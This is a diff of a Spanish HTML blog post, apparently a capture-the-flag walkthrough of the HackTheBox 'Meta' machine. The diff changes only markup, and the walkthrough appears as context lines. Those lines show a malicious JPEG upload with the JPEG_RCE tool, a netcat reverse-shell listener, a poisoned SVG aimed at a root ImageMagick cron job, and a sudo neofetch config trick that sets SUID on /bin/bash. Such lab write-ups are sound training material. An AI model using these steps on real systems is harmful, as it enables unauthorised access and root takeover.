@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/meta/001-inicio.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la maquina <code class="highlighter-rouge">Meta</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la maquina <code class="language-plaintext highlighter-rouge">Meta</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">meta</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">meta</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mkhack meta
 ❯ <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.11.140 | <span class="nb">grep </span>ttl | <span class="nb">awk</span> <span class="s1">'{print $4 $6}'</span>
 10.10.11.140:ttl<span class="o">=</span>63
@@ -36,7 +36,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 80/tcp open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p22</span>,80 <span class="nt">-sCV</span> 10.10.11.140 <span class="nt">-oN</span> allInfo
 Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-06-15 23:39 <span class="nt">-05</span>
@@ -57,7 +57,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
 <h2 id="enumeracion-web">ENUMERACION WEB</h2>
 
-<p>Podemos identificar que el puerto <code class="highlighter-rouge">80</code> tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión sin lograr evidenciar algún contenido.</p>
+<p>Podemos identificar que el puerto <code class="language-plaintext highlighter-rouge">80</code> tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión sin lograr evidenciar algún contenido.</p>
 
 <p>Se procede a realizar la enumeración de servicios web identificando un redireccionamiento de la dirección IP a el dominio artcorp.htb.</p>
 
@@ -77,13 +77,13 @@ Location: http://artcorp.htb
 Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
 </code></pre></div></div>
 
-<p>Como se puede identificar tenemos un virtual hosting, por lo que necesitamos modificar nuestro fichero <code class="highlighter-rouge">/etc/hosts</code></p>
+<p>Como se puede identificar tenemos un virtual hosting, por lo que necesitamos modificar nuestro fichero <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
 10.10.11.140    artcorp.htb
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
   <img src="/assets/images/meta/02-page.png" />       
   </p>
 
@@ -107,7 +107,7 @@ ID           Response   Lines    Word       Chars       Payload
 000001492:   200        9 L      24 W       247 Ch      "dev01"  
 </span></code></pre></div></div>
 
-<p>Encontramos el subdominio <code class="highlighter-rouge">dev01</code>, vamos a agregar el subdominio al fichero <code class="highlighter-rouge">/etc/hosts</code>.</p>
+<p>Encontramos el subdominio <code class="language-plaintext highlighter-rouge">dev01</code>, vamos a agregar el subdominio al fichero <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
 10.10.11.140    artcorp.htb dev01.artcorp.htb
@@ -115,19 +115,19 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p>Ahora que tenemos dos subdominios podremos ver un poco más a detalle la página web y así mismo podemos detectar que hay una ruta que nos permite cargar archivos como imágenes en formatos jpg y png.</p>
 
-<p align="center">
+<p style="text-align: center;">
  <img src="/assets/images/meta/03-page2.png" />       
  </p>
 
-<p align="center">
+<p style="text-align: center;">
   <img src="/assets/images/meta/03-page3.png" />       
   </p>
 
 <h2 id="exploit">EXPLOIT</h2>
 
-<p>Para esta ocasión vamos a hacer uso de la herramienta <a href="https://github.com/OneSecCyber/JPEG_RCE">JPEG_RCE</a> del github de <code class="highlighter-rouge">OneSecCyber</code></p>
+<p>Para esta ocasión vamos a hacer uso de la herramienta <a href="https://github.com/OneSecCyber/JPEG_RCE">JPEG_RCE</a> del github de <code class="language-plaintext highlighter-rouge">OneSecCyber</code></p>
 
-<p>Ingresamos a nuestra carpeta <code class="highlighter-rouge">exploit</code> y procedemos a descargar la herramienta.</p>
+<p>Ingresamos a nuestra carpeta <code class="language-plaintext highlighter-rouge">exploit</code> y procedemos a descargar la herramienta.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> ../exploit/
 https://github.com/OneSecCyber/JPEG_RCE
@@ -147,7 +147,7 @@ git clone https://github.com/OneSecCyber/JPEG_RCE.git
     1 image files updated
 </code></pre></div></div>
 
-<p>¡Muy bien! Precedemos a subir la imagen <code class="highlighter-rouge">runme.jpg</code> a la página víctima, sin embargo, antes de darle clic al botón para finalizar el proceso, debemos hacer un último paso, es necesario ponernos en escucha con la utilidad <code class="highlighter-rouge">nc</code> con el puerto que se indica al momento de realizar la reverse shell.</p>
+<p>¡Muy bien! Precedemos a subir la imagen <code class="language-plaintext highlighter-rouge">runme.jpg</code> a la página víctima, sin embargo, antes de darle clic al botón para finalizar el proceso, debemos hacer un último paso, es necesario ponernos en escucha con la utilidad <code class="language-plaintext highlighter-rouge">nc</code> con el puerto que se indica al momento de realizar la reverse shell.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lvnp</span> 4444
 listening on <span class="o">[</span>any] 4444 ...
@@ -167,9 +167,9 @@ whoami
 
 <h2 id="procmonsh">PROCMON.SH</h2>
 
-<p>Excelente! Sin embargo, por el momento solo somos el usuario www-data, así que luego de realizar diversos intentos de enumeraciones para escalar privilegios fallidas, ejecutamos un script denominado <code class="highlighter-rouge">procmon.sh</code> el cual nos va a permitir monitorear los comandos se están ejecutando en tiempo real en la máquina.</p>
+<p>Excelente! Sin embargo, por el momento solo somos el usuario www-data, así que luego de realizar diversos intentos de enumeraciones para escalar privilegios fallidas, ejecutamos un script denominado <code class="language-plaintext highlighter-rouge">procmon.sh</code> el cual nos va a permitir monitorear los comandos se están ejecutando en tiempo real en la máquina.</p>
 
-<p>Vamos a ir a la carpeta <code class="highlighter-rouge">/tmp</code> y con la utilidad <code class="highlighter-rouge">nano</code> creamos el archivo.</p>
+<p>Vamos a ir a la carpeta <code class="language-plaintext highlighter-rouge">/tmp</code> y con la utilidad <code class="language-plaintext highlighter-rouge">nano</code> creamos el archivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
 
@@ -199,7 +199,7 @@ nano procmon.sh
 &lt; /usr/local/bin/mogrify <span class="nt">-format</span> png <span class="k">*</span>.<span class="k">*</span>
 </code></pre></div></div>
 
-<p>Leemos el fichero <code class="highlighter-rouge">convet_images.sh</code> para entender su lógica y tomar provecho de ello.</p>
+<p>Leemos el fichero <code class="language-plaintext highlighter-rouge">convet_images.sh</code> para entender su lógica y tomar provecho de ello.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@meta:/tmp<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/convert_images.sh
 <span class="c">#!/bin/bash</span>
@@ -237,7 +237,7 @@ drwxr-xr-x 16 root     root     3080 Jun 19 19:18 ..
 <span class="nt">-rw-r--r--</span>  1 www-data www-data  426 Jun 20 14:07 poc.svg
 </code></pre></div></div>
 
-<p>Estamos listos para ingresar con un nuevo usuario por SSH, para esto vamos a crear un fichero <code class="highlighter-rouge">id_rsa</code> y se le asignan los permisos 600, requeridos para poder iniciar sesión con la llave obtenida.</p>
+<p>Estamos listos para ingresar con un nuevo usuario por SSH, para esto vamos a crear un fichero <code class="language-plaintext highlighter-rouge">id_rsa</code> y se le asignan los permisos 600, requeridos para poder iniciar sesión con la llave obtenida.</p>
 
 <h2 id="intrución">INTRUCIÓN</h2>
 
@@ -280,13 +280,13 @@ User thomas may run the following commands on meta:
 <p>Luego de investigar, encontramos que la variable XDG_CONFIG_HOME es potencial vector de escalamiento junto con el comando neofetch.</p>
 
 <ul>
-  <li>Entramos al a ruta <code class="highlighter-rouge">~/.config/neofetch</code></li>
-  <li>Ingresamos al fichero <code class="highlighter-rouge">config.conf</code></li>
-  <li>Agregamos la siguiente línea dando permisos suid a <code class="highlighter-rouge">/bin/bash</code></li>
-  <li>Asignamos la ruta modificada a la variable <code class="highlighter-rouge">XDG_CONFIG_HOME</code></li>
-  <li>Ejecutamos el comando <code class="highlighter-rouge">neofetch</code> como sudo</li>
-  <li>Revisamos los permisos suid de <code class="highlighter-rouge">/bin/bash</code></li>
-  <li>Ejecutamos el comando <code class="highlighter-rouge">bash -p</code> para tener acceso privilegiado a la maquina</li>
+  <li>Entramos al a ruta <code class="language-plaintext highlighter-rouge">~/.config/neofetch</code></li>
+  <li>Ingresamos al fichero <code class="language-plaintext highlighter-rouge">config.conf</code></li>
+  <li>Agregamos la siguiente línea dando permisos suid a <code class="language-plaintext highlighter-rouge">/bin/bash</code></li>
+  <li>Asignamos la ruta modificada a la variable <code class="language-plaintext highlighter-rouge">XDG_CONFIG_HOME</code></li>
+  <li>Ejecutamos el comando <code class="language-plaintext highlighter-rouge">neofetch</code> como sudo</li>
+  <li>Revisamos los permisos suid de <code class="language-plaintext highlighter-rouge">/bin/bash</code></li>
+  <li>Ejecutamos el comando <code class="language-plaintext highlighter-rouge">bash -p</code> para tener acceso privilegiado a la maquina</li>
 </ul>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@meta:~/.config/neofetch<span class="nv">$ </span>nano config.conf 
@@ -332,9 +332,9 @@ bash-5.0# <span class="nb">head</span> <span class="nt">-c</span> 10 root.txt<sp
 </span>4dea5795d3
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la maquina <code class="highlighter-rouge">Meta</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la maquina <code class="language-plaintext highlighter-rouge">Meta</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/meta/06-finish.png" />
 </p>
 
